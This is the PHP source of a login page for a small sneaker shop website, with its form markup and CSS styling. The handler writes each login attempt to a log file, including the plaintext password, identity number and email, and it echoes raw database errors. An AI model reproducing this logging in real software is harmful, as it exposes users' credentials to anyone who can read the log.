<?php
session_start();

if ($_SERVER["REQUEST_METHOD"] === "POST" && isset($_POST['submit']) && $_SERVER['SCRIPT_NAME'] === '/user_login.php') {
    $id_number = isset($_POST['id_number']) ? $_POST['id_number'] : '';
    $email = isset($_POST['email']) ? $_POST['email'] : '';
    $password = isset($_POST['password']) ? $_POST['password'] : '';

    // Log the login attempt
    $logEntry = "Login Attempt:\n";
    $logEntry .= "Identity Number: " . $id_number . "\n";
    $logEntry .= "Email: " . $email . "\n";
    $logEntry .= "Password: " . $password . "\n";
    $logEntry .= "User IP: " . $_SERVER['REMOTE_ADDR'] . "\n";
    $logEntry .= "Timestamp: " . date('Y-m-d H:i:s') . "\n";

    // Append the log entry to a log file
    file_put_contents('login_attempts.log', $logEntry, FILE_APPEND);

    require_once("config.php");
    $conn = mysqli_connect(SERVERNAME, USERNAME, PASSWORD, DATABASE) or die(mysqli_connect_error());

    // Retrieve the hashed password from the database
    $query = "SELECT user_Password FROM user WHERE user_IdentityNumber = ?";
    $stmt = mysqli_prepare($conn, $query);

    if ($stmt) {
        mysqli_stmt_bind_param($stmt, "s", $id_number);
        mysqli_stmt_execute($stmt);
        $result = mysqli_stmt_get_result($stmt);

        if (mysqli_num_rows($result) == 1) {
            $row = mysqli_fetch_assoc($result);
            $storedHashedPassword = $row['user_Password'];

            // Verify the password
            if (password_verify($password, $storedHashedPassword)) {
                // Passwords match. User login is successful.
                $_SESSION['access'] = "yes";
                header("Location: userhome.php");
                exit();
            } else {
                // Passwords don't match. User login failed.
                header("Location: login_user_failure.php");
                exit();
            }
        } else {
            // User not found in the database.
            header("Location: login_user_failure.php");
            exit();
        }

        mysqli_stmt_close($stmt);
    } else {
        // Error in preparing the SQL statement.
        echo "Error in preparing the statement: " . mysqli_error($conn);
    }

    mysqli_close($conn);
}
?>



<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>User Login</title>
  <link rel="stylesheet" type="text/css" href="style.css">
    <script src="https://kit.fontawesome.com/a076d05399.js" crossorigin="anonymous"></script>
    <link rel="stylesheet"
    href="https://unpkg.com/boxicons@latest/css/boxicons.min.css">
    <!-- icon -->
    <link rel="icon" type="image/png" href="logo.png"/>
    <style>
     
     body {
  margin: 0;
  padding: 0;
  font-family: Roboto, sans-serif;
  background: linear-gradient(120deg, #1a1a1a, #6b6b6b);
  display: flex;
  justify-content: center;
  align-items: center;
  min-height: 100vh;
}

.center {
  background: #E5E5E5;
  border-radius: 10px;
  padding: 20px;
  box-shadow: 0px 0px 20px rgba(0, 0, 0, 0.9); /* Adding a stronger box shadow for a 3D effect */
  text-align: center;
  max-width: 400px;
  width: 100%;
  transform: translateZ(35px); /* Applying a 3D transform to make it stand out */
}

/* Form Styles */
.txt_field {
  position: relative;
  margin: 20px 0;
}

.txt_field input {
  width: 100%;
  padding: 10px;
  border: none;
  border-bottom: 5px solid #111111;
  background: none;
  outline: none;
  font-size: 16px;
  color: #333;
}

.txt_field label {
  position: absolute;
  top: 50%;
  left: 0;
  transform: translateY(-50%);
  color: black;
  font-size: 16px;
  pointer-events: none;
  transition: 0.3s;
}

.txt_field input:focus ~ label,
.txt_field input:valid ~ label {
  top: -10px;
  font-size: 12px;
}

/* Button Styles */
input[type="submit"] {
  width: 100%;
  padding: 15px;
  background-color: #555555;
  border: none;
  border-radius: 25px;
  font-size: 18px;
  font-weight: bold;
  color:  #999999;
  cursor: pointer;
  transition: background-color 0.3s ease;
}

input[type="submit"]:hover {
  background-color: #333333;
}

.signup_link {
  margin-top: 20px;
  text-align: center;
  font-size: 16px;
  color: #666666;
}

.signup_link a {
  color: #2691d9;
  text-decoration: none;
}

.signup_link a:hover {
  text-decoration: underline;
}

/* Eye icon style */
.eye-icon {
      position: absolute;
      top: 50%;
      right: 10px;
      transform: translateY(-50%);
      cursor: pointer;
}

.error{
    color: red;
}
/* Style for fieldset-1 */
#fieldset-1 {
        background-color:  #b0b0b0;
        border: 1px solid #c0c0c0;
        padding: 20px;
        box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.9); /* Add a box shadow for a modern effect */
        transition: background-color 0.3s ease-in-out; /* Add a transition for background-color */
        position: relative; /* Position relative to allow z-index */
        }

        /* Add a hover effect to change the background color on hover */
        #fieldset-1:hover {
        background-color:#778899;
        }

        #fieldset-1 { z-index: 1; }


        /* Style for fieldset-2 */
        #fieldset-2 {
        background-color:  #c8c8c8;
        border: 1px solid #4682b4;
        padding: 20px;
        box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.9); /* Add a box shadow for a modern effect */
        transition: background-color 0.3s ease-in-out; /* Add a transition for background-color */
        position: relative; /* Position relative to allow z-index */
        }

        /* Add a hover effect to change the background color on hover */
        #fieldset-2:hover {
        background-color: #f0f0f0;
        }

        #fieldset-2 { z-index: 2; }

        /* Style for fieldset-3 */
        #fieldset-3 {
        background-color:  #333333;
        border: 1px solid #808080;
        padding: 20px;
        box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.9); /* Add a box shadow for a modern effect */
        transition: background-color 0.3s ease-in-out; /* Add a transition for background-color */
        position: relative; /* Position relative to allow z-index */
        }

        /* Add a hover effect to change the background color on hover */
        #fieldset-3:hover {
        background-color: #595959;
        }

        #fieldset-3 { z-index: 3; }


        /* Style for fieldset-4 */
        #fieldset-4 {
        background-color:  #4d4d4d;
        border: 1px solid #787878;
        padding: 20px;
        box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.9); /* Add a box shadow for a modern effect */
        transition: background-color 0.3s ease-in-out; /* Add a transition for background-color */
        position: relative; /* Position relative to allow z-index */
        }

        /* Add a hover effect to change the background color on hover */
        #fieldset-4:hover {
        background-color: #5f5f5f;
        }

        #fieldset-4 { z-index: 4; }




    </style>
</head>
<body>

  <!-- header -->
  <header class="header">
        <a href="index.php"><img src="logo.png" alt="logo" width="100" ></a>

        <!-- navigations -->
        <nav class="navbar" id = "fieldset-1" style = "border:none;">
            <input type="checkbox" id="check">
            <label for="check" class="checkbtn">
                <i class='bx bx-menu'></i>
            </label>
            <ul>
                <li><a href="index.php" class="active">🏠 Home</a></li>

                <li><a href="nike.php">Nike</a></li>
                <li><a href="jordan.php">Jordan</a></li>
                <li><a href="adidas.php">Adidas</a></li>
               
                <li><a href="signup.php" class="navbar2">✍️ Sign Up</a></li>
            </ul>
        </nav>
    </header>

<br> <br> <br> <br> <br> <br> <br> <br> 

<div class="center">
  <h1 style="font-size: 35px;">👤 User Login: </h1>
  <form method="POST" action="<?php echo htmlspecialchars($_SERVER["PHP_SELF"]); ?>">

    <div class="txt_field">
      <input type="text" name="id_number" id="id_number" required>
      <label for="id_number">Identity Number:</label>
    </div>

    <div class="txt_field">
      <input type="email" name="email" id="email" required>
      <label for="email">Email:</label>
    </div>

    <div class="txt_field">
      <input type="password" name="password" id="password" required>
      <label for="password">Password:</label>
      <i class="eye-icon" id="togglePassword" style = "font-size: 30px;">👁️</i>
    </div>

    <input name="submit" type="Submit" value="Login">
    <div class="signup_link">
      <p style="font-size: 16px; color: #666666;">Don't have an account yet? <a href="signup.php">Sign Up</a></p>
    </div>
  </form>
</div>



<!-- javascript Q7 -->
<script src="drop-down.js"></script> 
<script src="security_eye.js"></script>

</body>
</html>